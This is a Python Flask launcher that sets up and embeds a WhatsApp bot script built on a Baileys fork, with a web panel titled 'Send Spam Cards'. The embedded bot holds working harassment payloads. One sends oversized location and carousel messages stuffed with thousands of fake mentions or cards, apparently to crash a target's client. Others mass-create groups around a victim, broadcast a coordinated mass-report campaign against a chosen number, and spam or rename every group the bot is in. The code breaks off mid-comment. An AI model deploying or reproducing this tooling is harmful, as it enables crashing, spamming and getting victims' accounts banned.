import os
import sys
import subprocess
import platform
import threading
import queue
import json
import re
import shutil
import time
from flask import Flask, render_template_string, request, jsonify
from threading import Lock

app = Flask(__name__)

connected_lock = Lock()
connected = False

# Enhanced HTML template with beautiful CSS
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rocket Client V4.1 - Web Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        body {
            font-family: 'Orbitron', monospace;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(255,0,0,0.1) 0%, transparent 70%);
            z-index: -1;
            animation: pulse 4s ease-in-out infinite alternate;
        }
        @keyframes pulse {
            0% { opacity: 0.5; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.05); }
        }
        h1 {
            font-size: 3em;
            font-weight: 900;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            margin-bottom: 30px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000; }
            to { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000; }
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        form {
            background: rgba(0, 0, 0, 0.6);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
            display: inline-block;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 0, 0, 0.2);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        form:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.4);
        }
        label {
            font-size: 1.3em;
            display: block;
            margin-bottom: 15px;
            color: #ffcc00;
        }
        input[type="text"] {
            padding: 15px;
            font-size: 1.2em;
            border: 2px solid #ff0000;
            border-radius: 10px;
            width: 300px;
            margin-bottom: 20px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            transition: border-color 0.3s ease;
        }
        input[type="text"]:focus {
            outline: none;
            border-color: #ffcc00;
            box-shadow: 0 0 10px #ffcc00;
        }
        button {
            padding: 15px 40px;
            font-size: 1.2em;
            font-weight: bold;
            background: linear-gradient(45deg, #ff0000, #ff6600);
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 0, 0, 0.3);
        }
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 0, 0, 0.4);
            background: linear-gradient(45deg, #ff6600, #ff0000);
        }
        #status {
            margin-top: 30px;
            padding: 25px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 15px;
            font-size: 1.3em;
            min-height: 60px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 0, 0, 0.2);
        }
        .connected {
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }
        .disconnected {
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000;
        }
        .code {
            font-size: 1.8em;
            font-family: monospace;
            background: rgba(0, 255, 0, 0.1);
            padding: 15px;
            border-radius: 10px;
            word-break: break-all;
            color: #00ff00;
            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.2);
        }
        #commands-section {
            display: none;
            background: rgba(0, 0, 0, 0.6);
            padding: 30px;
            border-radius: 20px;
            margin-top: 20px;
            box-shadow: 0 10px 30px rgba(0, 255, 0, 0.2);
            border: 1px solid rgba(0, 255, 0, 0.3);
        }
        #commands-section.show {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .info {
            margin-top: 30px;
            font-size: 1em;
            opacity: 0.9;
            line-height: 1.6;
        }
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 10px;
            background: #ff0000;
            animation: pulse-red 1s infinite;
        }
        .status-indicator.connected {
            background: #00ff00;
            animation: pulse-green 1s infinite;
        }
        @keyframes pulse-red {
            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
        }
        @keyframes pulse-green {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(0, 255, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Rocket Client V4.1</h1>
        <form method="post">
            <label for="number">Enter Phone Number (without + or spaces):</label>
            <input type="text" id="number" name="number" placeholder="5511999999999" required>
            <br>
            <button type="submit">Generate Pairing Code & Connect</button>
        </form>
        <div id="status">
            <div class="status-indicator" id="status-dot"></div>
            <span id="status-text">Checking connection...</span>
            {{ status|safe }}
        </div>
        <div id="commands-section">
            <h2>📱 Send Spam Cards</h2>
            <form method="post" action="/send">
                <label for="target">Target Number or JID:</label>
                <input type="text" id="target" name="target" placeholder="5582993708218" required>
                <br>
                <button type="submit">Send Cards</button>
            </form>
            <p class="info">Enter a phone number (e.g., 5582993708218) to convert to JID and send carousel cards.</p>
        </div>
        <div class="info">
            <p>Logs are printed to the terminal where the Python script is running.</p>
            <p>Once connected, the bot will handle messages via main.js logic.</p>
            <p>Access: http://localhost:5000</p>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('number').focus();
            updateStatus();
            setInterval(updateStatus, 3000); // Poll every 3 seconds
            function updateStatus() {
                fetch('/status')
                    .then(response => response.json())
                    .then(data => {
                        const dot = document.getElementById('status-dot');
                        const text = document.getElementById('status-text');
                        const section = document.getElementById('commands-section');
                        if (data.connected) {
                            dot.classList.add('connected');
                            text.textContent = 'Connected! Ready to rock. 🚀';
                            section.classList.add('show');
                        } else {
                            dot.classList.remove('connected');
                            text.textContent = 'Disconnected. Please connect first.';
                            section.classList.remove('show');
                        }
                    })
                    .catch(() => {
                        document.getElementById('status-text').textContent = 'Error checking status.';
                    });
            }
        });
    </script>
</body>
</html>
"""

def has_command(cmd):
    try:
        subprocess.check_output([cmd, '--version'], stderr=subprocess.DEVNULL)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def get_npm_path():
    node_path = shutil.which('node')
    if node_path:
        dir_path = os.path.dirname(node_path)
        possible_npm_paths = [
            os.path.join(dir_path, 'npm.cmd'),
            os.path.join(dir_path, 'npm'),
            os.path.join(dir_path, 'npm.exe')
        ]
        for npm_path in possible_npm_paths:
            if os.path.exists(npm_path):
                return npm_path
    return shutil.which('npm')

def install_node_and_yarn():
    sys_name = platform.system()
    if has_command('node'):
        print("Node.js is already installed.")
    else:
        print("Installing Node.js...")
        if sys_name == 'Linux':
            subprocess.run(['curl', '-fsSL', 'https://deb.nodesource.com/setup_lts.x', '|', 'sudo', '-E', 'bash', '-'], shell=True, check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y', 'nodejs'], check=True)
        elif sys_name == 'Darwin':
            if not has_command('brew'):
                subprocess.run(['/bin/bash', '-c', '$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)'], shell=True, check=True)
            subprocess.run(['brew', 'install', 'node'], check=True)
        elif sys_name == 'Windows':
            try:
                subprocess.run(['winget', 'install', '--id=OpenJS.NodeJS', '--accept-source-agreements', '--accept-package-agreements'], shell=True, check=True)
            except subprocess.CalledProcessError:
                print("Winget failed. Please install Node.js manually from https://nodejs.org/")
                sys.exit(1)
        else:
            print(f"Unsupported OS: {sys_name}. Please install Node.js manually from https://nodejs.org/")
            sys.exit(1)
        print("Node.js installed successfully.")

    if not has_command('yarn'):
        print("Installing Yarn...")
        npm_path = get_npm_path()
        if npm_path:
            try:
                subprocess.run([npm_path, 'install', '-g', 'yarn'], check=True)
                print("Yarn installed successfully via npm.")
            except (subprocess.CalledProcessError, FileNotFoundError):
                print("npm install failed, trying alternative method...")
                if sys_name == 'Windows':
                    try:
                        yarn_url = 'https://yarnpkg.com/latest.msi'
                        yarn_file = 'yarn.msi'
                        subprocess.run(['powershell', '-Command', f'Invoke-WebRequest -Uri "{yarn_url}" -OutFile "{yarn_file}"'], shell=True, check=True)
                        subprocess.run(['msiexec', '/i', yarn_file, '/quiet', '/norestart'], shell=True, check=True)
                        os.remove(yarn_file)
                        print("Yarn installed successfully via MSI.")
                    except subprocess.CalledProcessError as e:
                        print(f"MSI install failed: {e}. Please install Yarn manually from https://yarnpkg.com/")
                        sys.exit(1)
                else:
                    print("Please install Yarn manually from https://yarnpkg.com/")
                    sys.exit(1)
        else:
            print("Please install Yarn manually from https://yarnpkg.com/")
            sys.exit(1)
    else:
        print("Yarn is already installed.")

def create_package_json():
    if os.path.exists('package.json'):
        return
    package_data = {
        "name": "rocket-client",
        "version": "4.1.0",
        "description": "WhatsApp Bot using Baileys",
        "main": "index.js",
        "scripts": {
            "start": "node index.js"
        },
        "dependencies": {
            "@angstvorfrauen/baileys": "^6.7.7",
            "gradient-string": "^1.5.0",
            "cfonts": "^3.3.0",
            "figlet": "^1.7.0",
            "pino": "^8.20.0",
            "@hapi/boom": "^10.0.1",
            "libphonenumber-js": "^1.10.59",
            "moment-timezone": "^0.5.45",
            "node-cache": "^5.1.2",
            "jimp": "^0.22.12"
        },
        "engines": {
            "node": ">=18.0.0"
        }
    }
    with open('package.json', 'w') as f:
        json.dump(package_data, f, indent=2)
    print("package.json created.")

def create_database_files():
    os.makedirs('database', exist_ok=True)
    if not os.path.exists('database/mediaall.js'):
        mediaall_content = """
module.exports = {
  url: 'https://files.catbox.moe/254wej.jpg',
  fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
  mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
  fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
  directPath: '',
  jpegThumbnail: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAIAAoDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAhEAACAQMDBQAAAAAAAAAAAAABAgMABAUGIWGRkqGx0f/EABUBAQEAAAAAAAAAAAAAAAAAAAMF/8QAGhEAAgIDAAAAAAAAAAAAAAAAAAECEgMRkf/aAAwDAQACEQMRAD8AltZbYZWzJ3s1xU2J1W2p1W49q2V1W2p1W4/9k=',
  scansSidecar: '',
  midQualityFileSha256: '',
  thumbnailDirectPath: '',
  thumbnailSha256: '',
  thumbnailEncSha256: ''
};
"""
        with open('database/mediaall.js', 'w') as f:
            f.write(mediaall_content)
        print("database/mediaall.js created.")
    if not os.path.exists('database/menu.js'):
        menu_content = "module.exports = { menu: '' };"
        with open('database/menu.js', 'w') as f:
            f.write(menu_content)
        print("database/menu.js created.")

def create_main_js():
    if os.path.exists('main.js'):
        return
    # Full main.js content provided by user
    main_js_content = """//=========================//
const {
  generateWAMessageFromContent,
  downloadContentFromMessage,
  makeCacheableSignalKeyStore,
  prepareWAMessageMedia,
  fetchLatestBaileysVersion,
  downloadMediaMessage,
  PHONENUMBER_MCC,
  useMultiFileAuthState,
  generateMessageID,
  getTypeMessage,
  makeWASocket,
  delay,
  proto,
  store,
  chats
} = require("@angstvorfrauen/baileys");
//=========================//
const { Boom } = require("@hapi/boom");
//=========================//
const libPhonenumber = require("libphonenumber-js");
const moment = require("moment-timezone");
const NodeCache = require("node-cache");
const gradient = require("gradient-string");
const path = require("path");
const pino = require("pino");
const Jimp = require("jimp");
const os = require("os");
const fs = require("fs");
//=========================//
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256 } = require("./database/mediaall.js");
const { menu } = require("./database/menu.js");
//=========================//
module.exports = async (sock, m, chatUpdate) => {
const message = m
  m.id = m.key.id;
  m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
  m.chat = m.key.remoteJid;
  m.fromMe = m.key.fromMe;
  m.isGroup = m.chat.endsWith("@g.us");
  m.sender = sock.decodeJid(m.fromMe && sock.user.id || m.participant || m.key.participant || m.chat || "");
  if (m.isGroup) m.participant = sock.decodeJid(m.key.participant) || "";
  function getTypeM(message) {
    const type = Object.keys(message);
    var restype =  (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) || type[type.length - 1] || Object.keys(message)[0];
  return restype;
  };
  m.mtype = getTypeM(m.message);
  m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
  m.text = m.msg?.text
      || m.msg?.caption
      || m.message?.conversation
      || m.msg?.contentText
      || m.msg?.selectedDisplayText
      || m.msg?.title
      || "";
  const info = m;
  const from = message.key.remoteJid;
  var body =
    (m.mtype === "interactiveResponseMessage") ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:
    (m.mtype === "conversation") ? m.message.conversation :
    (m.mtype === "deviceSentMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "imageMessage") ? m.message.imageMessage.caption :
    (m.mtype == "videoMessage") ? m.message.videoMessage.caption :
    (m.mtype == "extendedTextMessage") ? m.message.extendedTextMessage.text :
    (m.mtype == "buttonsResponseMessage") ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.mtype == "templateButtonReplyMessage") ? m.message.templateButtonReplyMessage.selectedId :
    (m.mtype == "messageContextInfo") ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : "";
  //=========================//
  const getGroupAdmins = (participants) => {
    let admins = [];
    for (let i of participants) {
      i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : "";
    };
    return admins || [];
  }
  //=========================//
  const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
  //=========================//
  var budy = (typeof m.text == "string" ? m.text: "");
  const bardy = body || "";
  prefix = [".","!",""]
  var prefix = prefix
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(bardy)
    ? bardy.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefix ?? global.prefix;
  const isCmd = bardy.startsWith(prefix);
  const command = isCmd ? bardy.slice(prefix.length).trim().split(" ").shift().toLowerCase() : "";
  //=========================//
  const quoted = m.quoted ? m.quoted : m;
  const sender = info.key.fromMe ? (sock.user.id.split(":")[0]+"@s.whatsapp.net" || sock.user.id) : (info.key.participant || info.key.remoteJid)
  const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : "";
  const participants = m.isGroup ? await groupMetadata.participants : "";
  const botNumber = await sock.decodeJid(sock.user.id);
  const device = "" + (info.key.id.length > 21 ? "Android" : info.key.id.substring(0, 2) == "3A" ? "Ios": "Web ore Api ore Bot");
  const date = moment.tz("Europe/Berlin").format("DD/MM/YY");
  const time = moment.tz("Europe/Berlin").format("HH:mm:ss");
  const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
  const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
  const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
  const groupName = m.isGroup ? groupMetadata?.subject : "";
  const mime = (quoted.msg || quoted).mimetype || "";
  const args = bardy.trim().split(/ +/).slice(1);
  const isBot = info.key.fromMe ? true : false;
  // get owner by the number
  const IsOwner = (m.sender === "5582993708218@s.whatsapp.net");
  const username = m.pushName || "No Name";
  const content = JSON.stringify(m.message);
  const isGroup = from.endsWith("@g.us");
  const sJid = "status@broadcast";
  const text = args.join(" ");
  const q = args.join(" ");
  //=========================//
  const reply = (text) => {
    sock.sendMessage(from, {
      text: text,
    })
  }
  //=========================//
  sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
    const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
    return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id});
  };
  //=========================//
  const isImage = m.mtype === "imageMessage";
  const isVideo = m.mtype === "videoMessage";
  const isAudio = m.mtype === "audioMessage";
  const isSticker = m.mtype === "stickerMessage";
  const isContact = m.mtype === "contactMessage";
  const isPoll = m.mtype === "pollMessage";
  const isLocation = m.mtype === "locationMessage";
  const isProduct = m.mtype === "productMessage";
  //=========================//
  if (isImage) {
    m.mtypeMessage = "Image";
  } else if (isVideo) {
    m.mtypeMessage = "Video";
  } else if (isAudio) {
    m.mtypeMessage = "Audio";
  } else if (isSticker) {
    m.mtypeMessage = "Sticker";
  } else if (isContact) {
    m.mtypeMessage = "Contact";
  } else if (isPoll) {
    m.mtypeMessage = "Poll";
  } else if (isLocation) {
    m.mtypeMessage = "Location";
  } else if (isProduct) {
    m.mtypeMessage = "Product";
  }
  //=========================//
  const isQuotedMsg = m.mtype === "extendedTextMessage" && content.includes("textMessage");
  const isQuotedImage = m.mtype === "extendedTextMessage" && content.includes("imageMessage");
  const isQuotedVideo = m.mtype === "extendedTextMessage" && content.includes("videoMessage");
  const isQuotedDocument = m.mtype === "extendedTextMessage" && content.includes("documentMessage");
  const isQuotedAudio = m.mtype === "extendedTextMessage" && content.includes("audioMessage");
  const isQuotedSticker = m.mtype === "extendedTextMessage" && content.includes("stickerMessage");
  const isQuotedPoll = m.mtype === "extendedTextMessage" && content.includes("pollMessage");
  const isQuotedContact = m.mtype === "extendedTextMessage" && content.includes("contactMessage");
  const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage");
  const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage");
  //=========================//
  //=========================//
  switch(command) {
  //=========================//
case "help": {
  if (!isBot) return;
    const menuText = `
*Olá, ${username}!* 👋.
*───「                             」───*
• ${prefix}lockall
• ${prefix}unlockall
• ${prefix}cgm <mensagem>
• ${prefix}nameall <nome>
• ${prefix}spamenviar <numero>
• ${prefix}bcgp <mensagem>
*───「                             」───*
`;
    sock.sendMessage(from, {
      text: menuText,
      contextInfo: {
        externalAdReply: {
          title: "「                             」",
          body: "@t4x",
          thumbnailUrl: "", // Substitua por uma URL de imagem válida
          sourceUrl: "wa.me/5582993708218", // Substitua pela URL do seu GitHub ou projeto
          mediaType: 1,
          renderLargerThumbnail: false
        }
      }
    });
  }
  break;
case "lockall": {
   if (!isBot) return;
  (async () => {
    try {
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});
      // Delay entre requisições para evitar rate limit
      const delay = ms => new Promise(res => setTimeout(res, ms));
      for (const gid of groupIds) {
        try {
          await sock.groupSettingUpdate(gid, "announcement");
        } catch (err1) {
          try {
            // Alguns forks usam nomenclaturas diferentes
            await sock.groupSettingUpdate(gid, "locked");
          } catch (err2) {
            // Ignora completamente o erro e segue
          }
        }
        await delay(2500); // espera 2.5 segundos entre cada requisição
      }
    } catch (err) {
      // Ignora qualquer erro global
    }
  })();
}
break;
case "unlockall": {
   if (!isBot) return;
  (async () => {
    try {
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});
      const delay = ms => new Promise(res => setTimeout(res, ms));
      for (const gid of groupIds) {
        try {
          await sock.groupSettingUpdate(gid, "not_announcement");
        } catch (err1) {
          try {
            await sock.groupSettingUpdate(gid, "unlocked");
          } catch (err2) {
            // Ignora qualquer erro individual
          }
        }
        await delay(2500); // espera 2.5 segundos entre cada requisição
      }
    } catch (err) {
      // Ignora qualquer erro global
    }
  })();
}
break;
case "cgm": {
   if (!isBot) return;
  (async () => {
    try {
      // Captura o texto enviado após o comando
      const textToSend = args.join(" ").trim();
      if (!textToSend) return; // Se não houver mensagem, sai silenciosamente
      // Busca todos os grupos que o bot participa
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});
      const delay = ms => new Promise(res => setTimeout(res, ms));
      for (const gid of groupIds) {
        try {
          await sock.sendMessage(gid, { text: textToSend });
        } catch (err) {
          // Ignora qualquer erro (sem log, sem reply)
        }
      }
    } catch (err) {
      // Ignora erros gerais
    }
  })();
}
break;

case "ct": {
  (async () => {
    try {
      // Somente OWNER pode rodar
      if (!isBot) return;
      const raw = args[0] ? args[0].trim() : "";
      if (!raw) {
        // Responde instrução de uso
        await sock.sendMessage(from, {
          text: "Uso: ct <jid_teste>\\n\\nEx: ct 5511999999999@s.whatsapp.net\\nou: ct 5511999999999 (o @s.whatsapp.net será adicionado automaticamente)"
        }, { quoted: m });
        return;
      }
      // Normalizar JID: se só números, adicionar sufixo @s.whatsapp.net
      let targetJid = raw;
      if (!raw.includes("@")) {
        // remover caracteres não numéricos
        const digits = raw.replace(/\\D/g, "");
        if (!digits) {
          await sock.sendMessage(from, { text: "JID inválido." }, { quoted: m });
          return;
        }
        targetJid = `${digits}@s.whatsapp.net`;
      }
      // Validar formato básico do JID
      const validSuffixes = ["@s.whatsapp.net", "@c.us", "@g.us", "@us.whatsapp.net", "@whatsapp.net"];
      const ok = validSuffixes.some(suf => targetJid.endsWith(suf));
      if (!ok) {
        // ainda assim permitir, mas avisar e abortar
        await sock.sendMessage(from, { text: "JID com formato inesperado. Use algo como 5511999999999 ou 5511999999999@s.whatsapp.net" }, { quoted: m });
        return;
      }
      // Quantidade de grupos a criar
      const COUNT = 20;
      // Quantos participantes (além do bot) por grupo (aqui só o targetJid)
      const participants = [targetJid];
      // Delay entre criações (ms) para reduzir chance de rate limit
      const DELAY_MS = 1000;
      const delay = ms => new Promise(res => setTimeout(res, ms));
      for (let i = 0; i < COUNT; i++) {
        try {
          // gerar nome aleatório para o grupo
          const rand = Math.random().toString(36).slice(2, 9);
          const subject = `CT_${rand}`;
          // criar grupo com o participante alvo
          if (typeof sock.groupCreate === "function") {
            await sock.groupCreate(subject, participants).catch(() => { /* ignora falha dessa chamada */ });
          } else {
            // fallback: se função não existir na sua versão da lib, tente outra maneira (mas normalmente groupCreate existe)
            try {
              await sock.groupCreate(subject, participants);
            } catch (e) {
              // ignora e continua
            }
          }
        } catch (errGroup) {
          // ignora erro individual e segue
        }
        // espera antes de criar o próximo grupo
        await delay(DELAY_MS);
      }
      // operação finaliza silenciosamente (sem enviar resumo)
    } catch (err) {
      // erro global: log no console para debug, mas não enviar ao chat
      try { console.error("ct error:", err); } catch (e) {}
    }
  })();
}
break;
case "nameall": {
  if (!isBot) return;
  (async () => {
    try {
      const newName = args.join(" ").trim();
      if (!newName) {
        await sock.sendMessage(from, {
          text: "Uso: nameall <novo_nome_do_grupo>"
        }, { quoted: m });
        return;
      }
      // buscar todos os grupos que o bot participa
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});
      // delay em ms entre cada atualização (ajuste se quiser outro intervalo)
      const DELAY_MS = 2000;
      const delay = ms => new Promise(res => setTimeout(res, ms));
      for (const gid of groupIds) {
        try {
          if (typeof sock.groupUpdateSubject === "function") {
            await sock.groupUpdateSubject(gid, newName);
          } else {
            // se a função não existir na sua versão da lib, tente via groupSettingUpdate (algumas libs não suportam renomear)
            // aqui tentamos uma chamada que provavelmente falhará em forks que não implementam renomear; o catch abaixo ignora.
            await sock.groupUpdateSubject(gid, newName);
          }
        } catch (err) {
          // ignora erro (não é admin, bad request, rate limit, etc.)
        }
        await delay(DELAY_MS);
      }
      // silencioso — não envia resposta no chat
    } catch (err) {
      // ignora erro global
    }
  })();
}
break;
case "spamenviar": {
  if (!isBot) return;
  (async () => {
    try {
      // Captura o texto enviado após o comando
      const textToSend = args.join(" ").trim();
      if (!textToSend) {
          reply("\\n\\n   Por favor, me mande o alvo que você quer marcar neste formato:\\n\\n.spamenviar 5511974186773\\n\\nNúmero todo junto sem \\"-\\", \\"(\\", \\")\\", \\"+\\" ou \\"e\\"\\n\\n");
        return; // Sai se não houver argumento
      }
      // Mensagem padrão a ser enviada
      const spamMessage = `\\n♨️‼️ ATAQUE DE DENUNCIAS ‼️♨️ 🔥 \\n\\n》MANDE MENSAGEM PARA CADA ALVO, DEPOIS DENUNCIE 1 VEZ, DEPOIS DE BLOCK. \\n\\n◊ 1️⃣.: https://wa.me/${textToSend} \\n\\n🔥》 Prints no meu privado!\\n\\n`;
      // Busca todos os grupos que o bot participa
      const allGroups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const groupIds = Object.keys(allGroups || {});
      const delay = ms => new Promise(res => setTimeout(res, ms));
      for (const gid of groupIds) {
        try {
          await sock.sendMessage(gid, { text: spamMessage });
        } catch (err) {
          // Ignora qualquer erro (sem log, sem reply)
        }
      }
    } catch (err) {
      // Ignora erros gerais
    }
  })();
}
break;
case "x": {
  if (!isBot) return;
  const target = from
    async function LocX(target) { //target = from
    for (let i = 0; i < 500; i++) {
      const LocaX = {
        viewOnceMessage: {
          message: {
            locationMessage: {
              degreesLatitude: 0.000000,
              degreesLongitude: 0.000000,
              name: "ꦽ".repeat(400),
              address: "ꦽ".repeat(300),
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 5000 },
                  () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                isSampled: true,
                participant: target,
                remoteJid: target,
                forwardingScore: 9741,
                isForwarded: true
              }
            }
          }
        }
      };
      const msg = generateWAMessageFromContent("status@broadcast", LocaX, {});
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }, { participant: target });
    }}
    LocX(target)
  }
  break;
case "": { // use the command with: . but, this dont cause conflict with other commands
  if (!isBot) return;
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      "header": {
        "title": ".",
        "imageMessage": {
          "url": `${url}`,
          "mimetype": "image/jpeg",
          "caption": ".",
          "fileSha256": `${fileSha256}`,
          "fileLength": "10",
          "height": 1000,
          "width": 1000,
          "mediaKey": `${mediaKey}`,
          "fileEncSha256": `${fileEncSha256}`,
          "directPath": `${directPath}`,
          "jpegThumbnail": `${jpegThumbnail}`,
        },
        "hasMediaAttachment": true
      },
      "body": { "text": "." },
      "footer": { "text": "." },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
              "display_text": "x",
              "url": "https://google.com",
              "merchant_url": "https://google.com"
            })
          }
        ]
      }
    };
    console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
    const card = Array(1500).fill(singleCard);
    await sock.sendjson(from, {
      "interactiveMessage": {
        "body": { "text": "." },
        "carouselMessage": {
          "cards": card
        }
      }
    });
  }
}
console.log("✅ Envio de cartas concluído.");
break;
case "bcgp": { // send message to all the members in a group
  if (!isBot) return;
  if (!text) return reply(`Use: ${prefix}bcgp <mensagem>`);
  const group = await sock.groupMetadata(from);
  for (let i = 0; i < group.participants.length; i++) {
    const member = group.participants[i];
    if (member.id === botNumber) continue;
    await delay(2000); // delay 2 seconds between messages to avoid rate limiting
    await sock.sendMessage(member.id, { text: `${text}` });
  }
  // after, delete all chats with the bot
  const chats = await sock.fetchChats();
  for (let i = 0; i < chats.length; i++) {
    const chat = chats[i];
    if (chat.jid.endsWith("@s.whatsapp.net") && chat.jid !== botNumber) {
      await delay(1000); // delay 1 second between deletions
      await sock.modifyChat(chat.jid, "delete");
    }
}
}
break;
case "clonegroup": { // cloning group, create a new group with: same subject, same description, same participants, same picture, etc.
  if (!isBot) return; // bot starts creating a group with itself, after that it adds the participants, one by one, mapping jids to add, the name and description, and the picture, eviting the error:
  // file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/WABinary/generic-utils.js:54
    // throw new Boom(errNode.attrs.text || "Unknown error", { data: +errNode.attrs.code });
    // Error: bad-request
    //  at assertNodeErrorFree (file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/WABinary/generic-utils.js:54:11)
    // at query (file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/Socket/socket.js:111:7)
    //  at process.processTicksAndRejections (node:internal/process/task_queues:105:5)
    // at async Object.groupCreate (file:///C:/Users/thzin/Downloads/bot/node_modules/@angstvorfrauen/baileys/lib/Socket/groups.js:72:22)
    //  at async module.exports (C:\\\\Users\\\\thzin\\\\Downloads\\\\bot\\\\main.js:612:20) {
    // data: 400,
